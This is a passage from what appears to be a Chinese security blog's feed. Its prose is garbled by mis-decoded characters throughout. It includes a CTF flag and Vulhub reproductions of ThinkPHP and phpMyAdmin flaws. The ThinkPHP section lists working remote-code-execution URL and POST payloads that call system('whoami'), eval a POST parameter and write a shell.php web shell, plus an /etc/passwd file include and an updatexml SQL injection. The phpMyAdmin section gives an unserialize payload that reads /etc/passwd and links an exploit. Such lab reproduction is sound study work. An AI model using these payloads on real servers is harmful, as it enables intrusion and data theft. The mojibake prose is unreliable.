style="zoom:80%;"><p>æ’­æ”¾å‘ç°ç¬¬ä¸‰æ®µ</p><p><img src="/2020/03/18/ctf-time%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/TIM%E6%88%AA%E5%9B%BE20200319002446.png"></p><p>æ‹¼æ¥åˆ°ä¸€èµ·å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSEC&#123;c0me_wi4h_f4t_m4n_t0_7h3_3nd_0f_t4i3_sUsEc_journey&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="http://www.gtfly.top/2020/03/16/2020-ConfidenceCTF-wp/">http://www.gtfly.top/2020/03/16/2020-ConfidenceCTF-wp/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> ctftime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubä¹‹thinkphp</title>
      <link href="2020/03/07/Vulhub%E4%B9%8Bthinkphp/"/>
      <url>2020/03/07/Vulhub%E4%B9%8Bthinkphp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦å¤ç°äº†Vulhubä¸Šthinkphpç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="2-X-RCE"><a href="#2-X-RCE" class="headerlink" title="2.X RCE"></a>2.X RCE</h2><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>åœ¨ThinkPHP ThinkPHP 2.xç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨preg_replaceçš„/eæ¨¡å¼åŒ¹é…è·¯ç”±ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.$depr.<span class="string">&#x27;([^&#x27;</span>.$depr.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode($depr,$paths));</span><br></pre></td></tr></table></figure><p>å¯¼è‡´ç”¨æˆ·çš„è¾“å…¥å‚æ•°è¢«æ’å…¥åŒå¼•å·ä¸­æ‰§è¡Œï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>è¯¦ç»†å†…å®¹å‚è§ï¼š<a href="https://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">https://www.moonback.xyz/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a></p><p>ThinkPHP 3.0ç‰ˆæœ¬å› ä¸ºLiteæ¨¡å¼ä¸‹æ²¡æœ‰ä¿®å¤è¯¥æ¼æ´ï¼Œä¹Ÿå­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚</p><p>å…ˆä»‹ç»ä¸€ä¸‹TPçš„è·¯ç”±è§„åˆ™</p><p>URLè®¿é—®æ¨¡å¼,å¯é€‰å‚æ•°0ã€1ã€2ã€3,ä»£è¡¨ä»¥ä¸‹å››ç§æ¨¡å¼ï¼š</p><ul><li>0 (æ™®é€šæ¨¡å¼)</li><li>1 (PATHINFO æ¨¡å¼) -&gt;é»˜è®¤ä½¿ç”¨</li><li>2 (REWRITE  æ¨¡å¼)</li><li>3 (å…¼å®¹æ¨¡å¼)</li></ul><p>PATHINFO æ¨¡å¼è¿˜åˆ†ä¸º3ç§è§„åˆ™,ä½¿ç”¨æ•°å­—1ã€2ã€3ä»£è¡¨ä»¥ä¸‹ä¸‰ç§æ¨¡å¼:</p><ul><li>1 æ™®é€šæ¨¡å¼(å‚æ•°æ²¡æœ‰é¡ºåº,ä¾‹å¦‚<code>/m/module/a/action/id/1</code>)</li><li>2 æ™ºèƒ½æ¨¡å¼(ç³»ç»Ÿé»˜è®¤ä½¿ç”¨çš„æ¨¡å¼ï¼Œå¯è‡ªåŠ¨è¯†åˆ«æ¨¡å—å’Œæ“ä½œ<code>/module/action/id/1/</code> æˆ–è€… <code>/module,action,id,1/</code>â€¦)</li><li>3 å…¼å®¹æ¨¡å¼(é€šè¿‡ä¸€ä¸ªGETå˜é‡å°†PATHINFOä¼ é€’ç»™dispatherï¼Œé»˜è®¤ä¸ºsï¼Œä¾‹å¦‚<code>index.php?s=/module/action/id/1</code>)</li></ul><p>è¿™äº›ä¸œè¥¿åœ¨<code>ThinkPHP/Common/convention.php</code>ä¸­å®šä¹‰çš„æœ‰</p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200311232407.png" style="zoom:80%;"><p>æ¼æ´å‡ºç°çš„ä½ç½®ä½äº<code>ThinkPHP/Lib/Think/UtilDispatcher.class.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200311233959.png" style="zoom:80%;"><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æˆ‘ä»¬å¯ä»¥æ„é€ æ²¡æœ‰çš„è·¯ç”±è§„åˆ™æ¥rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?s=a/b/c/$&#123;phpinfo()&#125;</span><br><span class="line">s=a/b/c/$&#123;<span class="keyword">eval</span>($_POST[<span class="number">1</span>])&#125;</span><br><span class="line">?s=a/b/c/$&#123;@<span class="keyword">print</span>(<span class="keyword">eval</span>($_POST[<span class="number">1</span>]))&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200312234457.png" style="zoom:80%;"><h2 id="5-0-23-RCE"><a href="#5-0-23-RCE" class="headerlink" title="5.0.23 RCE"></a>5.0.23 RCE</h2><h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>ç”±äºæ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>æ¼æ´ä½äº<code>thinkphp/library/think/Request.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200312235306.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°é€šè¿‡å¤–éƒ¨ä¼ å…¥<code>Config::get(&#39;var_method&#39;)</code>å¯ä»¥é€ æˆè¯¥ç±»çš„ä»»æ„æ–¹æ³•è°ƒç”¨</p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200316231420.png" style="zoom: 80%;"><p>è¿™é‡Œæˆ‘ä»¬åˆå¯ä»¥å°†ç±»å±æ€§è¿›è¡Œæ›¿æ¢</p><p>å•Š å¤ªéš¾äº† å…ˆæŒ–å¥½å‘ï¼ã€‚ã€‚ã€‚ã€‚ã€‚</p><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æˆ‘ä»¬æœ€ç»ˆæ„é€ çš„payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">POST1ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">POST2ï¼š_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»»æ„æ–‡ä»¶åŒ…å«</span></span><br><span class="line">POST: _method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/etc/passwd</span><br></pre></td></tr></table></figure><p><strong>å‘½ä»¤æ‰§è¡Œ1ï¼š</strong></p><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200316232827.png"></p><p><strong>å‘½ä»¤æ‰§è¡Œ2ï¼š</strong></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200316232700.png" style="zoom:80%;"><p><strong>ä»»æ„æ–‡ä»¶è¯»å–ï¼š</strong></p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIMæˆªå›¾20200316232546.png" style="zoom:80%;"><h2 id="5-rce"><a href="#5-rce" class="headerlink" title="5-rce"></a>5-rce</h2><h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/9113969-11a5b23a7c4f0a75.png" style="zoom:80%;"><p>å½±å“èŒƒå›´</p><blockquote><p>5.x &lt; 5.1.31<br>5.x &lt;= 5.0.23</p></blockquote><p>æ¼æ´ç‚¹åœ¨<code>library/think/route/dispatch/Module.php</code></p><p>ç•™ä¸ªå‘</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>5.1.x phpç‰ˆæœ¬&gt;5.5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/think\request/input?data[]=phpinfo()&amp;filter=assert</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&amp;content=<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>5.0.x phpç‰ˆæœ¬&gt;=5.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span></span><br><span class="line">http:<span class="comment">//your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br><span class="line"></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1</span><br><span class="line"></span><br><span class="line">/thinkphp/<span class="keyword">public</span>/?s=index/\think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">system</span>&amp;<span class="title">vars</span>=<span class="title">dir</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/<span class="title">thinkphp</span>/<span class="title">public</span>/?<span class="title">s</span>=<span class="title">index</span>/\<span class="title">think</span>\<span class="title">app</span>/<span class="title">invokefunction</span>&amp;<span class="title">function</span>=<span class="title">system</span>&amp;<span class="title">return_value</span>=&amp;<span class="title">command</span>=<span class="title">dir</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">/thinkphp/public/?s=index/\think\app/invokefunction&amp;function=system&amp;vars[0]=dir&amp;vars[1][]=</span><br><span class="line"></span><br><span class="line">/thinkphp/<span class="keyword">public</span>/index.php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200318230505.png"></p><h2 id="in-sqlinjection"><a href="#in-sqlinjection" class="headerlink" title="in-sqlinjection"></a>in-sqlinjection</h2><h3 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¦æ±‚è¦å¼€å¯DEBUGæ¨¡å¼</p><p>Tpå®˜æ–¹ç‰ˆæœ¬5.0.9é»˜è®¤ä¾æ—§æ˜¯å¼€æ”¾ç€è°ƒè¯•æ¨¡å¼</p><h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å¯ä»¥çˆ†å‡ºæ•°æ®åº“è´¦å·å¯†ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ids[<span class="number">0</span>,updatexml(<span class="number">0</span>,concat(<span class="number">0xa</span>,user()),<span class="number">0</span>)]=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/07/Vulhub%E4%B9%8Bthinkphp/TIM%E6%88%AA%E5%9B%BE20200318231831.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/">https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/</a></p><p><a href="https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://xz.aliyun.com/t/3845">https://xz.aliyun.com/t/3845</a></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><p><a href="https://xz.aliyun.com/t/125">https://xz.aliyun.com/t/125</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> thinkphp </tag>
            
            <tag> vulhub </tag>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulhubä¹‹phpmyadmin</title>
      <link href="2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/"/>
      <url>2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦è®°å½•äº†Vulhubä¸Šphpmyadminæ¼æ´çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>å·²ç™»å½•çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åŒ…å«ä»»æ„æ–‡ä»¶æ¥è¯»å–å†…å®¹ï¼Œè¿›ä¸€æ­¥å¯ä»¥åŒ…å«sessionæ¥getshell</p><h3 id="å½±å“èŒƒå›´"><a href="#å½±å“èŒƒå›´" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><p>phpmyadminç‰ˆæœ¬ï¼š4.8.0å’Œ4.8.1å—åˆ°å½±å“</p><h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>å¤ç°è¿‡ç¨‹ï¼š<a href="https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613%E5%A4%8D%E7%8E%B0">https://www.moonback.xyz/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/#CVE-2018-12613å¤ç°</a></p><h2 id="CVE-2016-5734"><a href="#CVE-2016-5734" class="headerlink" title="CVE-2016-5734"></a>CVE-2016-5734</h2><h3 id="æ¼æ´ç®€ä»‹-1"><a href="#æ¼æ´ç®€ä»‹-1" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>phpMyAdminæ˜¯ä¸€å¥—å¼€æºçš„ã€åŸºäºWebçš„MySQLæ•°æ®åº“ç®¡ç†å·¥å…·ã€‚åœ¨å…¶æŸ¥æ‰¾å¹¶æ›¿æ¢å­—ç¬¦ä¸²åŠŸèƒ½ä¸­ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯æ‹¼æ¥è¿›<code>preg_replace</code>å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ã€‚</p><p>åœ¨PHP5.4.7ä»¥å‰ï¼Œ<code>preg_replace</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨<code>\0</code>è¿›è¡Œæˆªæ–­ï¼Œå¹¶å°†æ­£åˆ™æ¨¡å¼ä¿®æ”¹ä¸ºeã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œeæ¨¡å¼çš„æ­£åˆ™æ”¯æŒæ‰§è¡Œä»£ç ï¼Œæ­¤å·²ç™»å½•çš„æ”»å‡»è€…ä¾¿å¯æ„é€ ä¸€ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="å½±å“èŒƒå›´-1"><a href="#å½±å“èŒƒå›´-1" class="headerlink" title="å½±å“èŒƒå›´"></a>å½±å“èŒƒå›´</h3><ul><li>4.0.10.16ä¹‹å‰4.0.xç‰ˆæœ¬</li><li>4.4.15.7ä¹‹å‰4.4.xç‰ˆæœ¬</li><li>4.6.3ä¹‹å‰4.6.xç‰ˆæœ¬ï¼ˆå®é™…ä¸Šç”±äºè¯¥ç‰ˆæœ¬è¦æ±‚PHP5.5+ï¼Œæ‰€ä»¥æ— æ³•å¤ç°æœ¬æ¼æ´ï¼‰</li></ul><h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>exp(python2)åœ°å€ï¼š<a href="https://www.exploit-db.com/exploits/40185">https://www.exploit-db.com/exploits/40185</a></p><p>è¿™é‡Œä¸‹è½½çš„æ˜¯4.4.15.6ç‰ˆæœ¬ï¼Œå†å²ä¸‹è½½ç‰ˆæœ¬ï¼š<a href="https://www.phpmyadmin.net/files/">https://www.phpmyadmin.net/files/</a></p><p><code>tbl_find_replace.php</code>çš„24è¡Œä¸­ï¼Œå°†POSTçš„<code>find</code>å’Œ<code>replaceWwith</code>ä¼ å…¥åˆ°äº†<code>$table_search</code>çš„<code>getReplacePreview</code>æ–¹æ³•ä¸­</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308215820.png" style="zoom:80%;"><p><code>$table_search</code>æ˜¯<code>PMA_TableSearch</code>å¯¹è±¡å®ä¾‹åŒ–çš„ç»“æœ,è€Œ<code>PMA_TableSearch</code>åœ¨<code>libraries/TableSearch.class.php</code>ä¸­è¿›è¡Œäº†å®šä¹‰ï¼Œæˆ‘ä»¬å®šä½åˆ°<code>libraries/TableSearch.class.php</code>çš„1430è¡Œ</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308220159.png" style="zoom:80%;"><p>åœ¨<code>getReplacePreview</code>æ–¹æ³•ä¸­ï¼Œç”±äºexpä¸­è®¾å®šäº†<code>$useRegex</code>çš„å€¼ï¼Œæ‰€ä»¥å‚æ•°ç»§ç»­ä¼ é€’åˆ°<code>_getRegexReplaceRows</code>æ–¹æ³•ä¸­ï¼Œå®šä½åˆ°1388è¡Œ</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308220442.png" style="zoom:80%;"><p>åœ¨1408~1413è¡Œå½“ä¸­ï¼Œ<code>preg_replace(&quot;/&quot; . $find . &quot;/&quot;, $replaceWith, $row[0]);</code>å¾ˆç»å…¸åœ°è¿˜åŸäº†55856 Bugçš„åœºæ™¯ï¼Œexpä¸­é€šè¿‡<code> &quot;find&quot;: &quot;0/e\0&quot;,&quot;replaceWith&quot;: payload,</code>çš„POSTæäº¤ï¼Œç©ºå­—èŠ‚æˆªæ–­å¹¶ä¼ å…¥eä¿®é¥°ç¬¦è¿›è€Œæ‰§è¡Œæˆ‘ä»¬çš„payloadï¼Œä¹Ÿå°†æ›¿æ¢çš„ç»“æœè¿›è¡Œäº†å›ä¼ ï¼Œæœ€ç»ˆçš„å¤ç°å¦‚ä¸‹ï¼š</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308221054.png" style="zoom:80%;"><h2 id="WooYun-2016-199433"><a href="#WooYun-2016-199433" class="headerlink" title="WooYun-2016-199433"></a>WooYun-2016-199433</h2><h3 id="æ¼æ´ç®€ä»‹-2"><a href="#æ¼æ´ç®€ä»‹-2" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>phpmyadmin 2.xç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥æ¼æ´æ— éœ€è®¤è¯ç™»é™†ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h3 id="æ¼æ´èŒƒå›´"><a href="#æ¼æ´èŒƒå›´" class="headerlink" title="æ¼æ´èŒƒå›´"></a>æ¼æ´èŒƒå›´</h3><p>phpmyadmin:2.X(å…·ä½“ç‰ˆæœ¬ä¸æ¸…æ¥šï¼Œæµ‹è¯•ç”¨çš„æ˜¯2.8.0.4)</p><h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>åœ¨<code>scripts/setup.php</code>ä¸­ï¼Œå­˜åœ¨è¾“å…¥å˜é‡<code>configuration</code>,è¯¥å˜é‡ä¼šè¢«<code>unserialize</code>å‡½æ•°è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308225027.png" style="zoom:80%;"><p>å½“é€šè¿‡è¯¥è¾“å…¥ç‚¹ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œä¼šç»ååºåˆ—åŒ–å‡ºæ¥ä¸€ä¸ªå¯¹è±¡ã€‚åœ¨è¿™ä¸ªå¯¹è±¡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨è§¦å‘æŸäº›é­”æ³•å‡½æ•°ã€‚</p><p><code>scripts/setup.php</code>é€šè¿‡<code>require_once</code>å‡½æ•°å¼•å…¥äº†<code>librarise/common.lib.php</code>æ–‡ä»¶</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308225340.png" style="zoom:80%;"><p>è€Œ<code>librarise/common.lib.php</code>åˆå¼•å…¥äº†<code>librarise/Config.class.php</code></p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308225537.png" style="zoom:80%;"><p>åœ¨<code>librarise/Config.class.php</code>ä¸­å­˜åœ¨é­”æ³•å‡½æ•°<code>__wakeup</code>ï¼Œè¯¥é­”æ³•å‡½æ•°åœ¨å¯¹è±¡è¢«ååºåˆ—åŒ–ä¹‹åç«‹å³è¢«è§¦å‘è°ƒç”¨ï¼š</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308225925.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°ï¼Œå…¶å†…åœ¨æ»¡è¶³æ¡ä»¶åï¼Œä¼šè°ƒç”¨<code>load()</code>å‡½æ•°ã€‚ç»§ç»­è·Ÿè¸ª<code>load()</code>å‡½æ•°ï¼š</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308230130.png" style="zoom:80%;"><p>å½“æ£€æµ‹åˆ°<code>file_get_contents</code>è¢«å®šä¹‰ï¼Œåˆ™é€šè¿‡<code>eval</code>å‡½æ•°æ‰§è¡Œè¯»å…¥çš„å­—ç¬¦ä¸²ï¼›å¦‚æœæ²¡æœ‰<code>file_get_contents</code>å‡½æ•°ï¼Œåˆ™é€šè¿‡<code>file</code>è¯»å…¥æ–‡ä»¶ï¼ŒåŒæ—¶åˆ©ç”¨<code>implode</code>å‡½æ•°æŠŠæ–‡ä»¶å†…å®¹åˆ©ç”¨<code>\n</code>æ‹¼æ¥ï¼Œå†æ‰§è¡Œ<code>eval</code>å‡½æ•°ã€‚</p><p>æ•´ä½“æ€è·¯ï¼šphp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup.php-&gt;common.lib.php-&gt;Config.<span class="keyword">class</span>.php-&gt;__wakeup()-&gt;load()-&gt;eval();</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯å›é¡¾è·Ÿè¸ªéœ€è¦æ»¡è¶³çš„å­—æ®µå’Œæ„é€ ç‰¹å®šçš„åºåˆ—åŒ–æ•°æ®ï¼š</p><p>åœ¨è¾“å…¥ç‚¹ä½ç½®<code>setup.php</code>ä¸­ï¼Œéœ€è¦å…·å¤‡2ä¸ªä¼ å‚å­—æ®µ<code>actionå’Œconfiguration</code>ï¼ŒåŒæ—¶åˆ›å»ºäº†<code>$PMA_Config = new PMA_Config();</code></p><p>è€Œåœ¨æ§åˆ¶ç‚¹çš„<code>load</code>å‡½æ•°ä¸­ï¼Œåˆ™åªéœ€è¦ä¼ å…¥å½¢å‚<code>source</code>å’Œå¯¹åº”çš„ç‰¹å®šæ•°æ®å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PMA_Config</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> PMA_Config();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥è¯»æ–‡ä»¶äº†</p><img src="/2020/03/07/Vulhub%E4%B9%8Bphpmyadmin/TIMæˆªå›¾20200308232307.png" style="zoom:80%;"><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 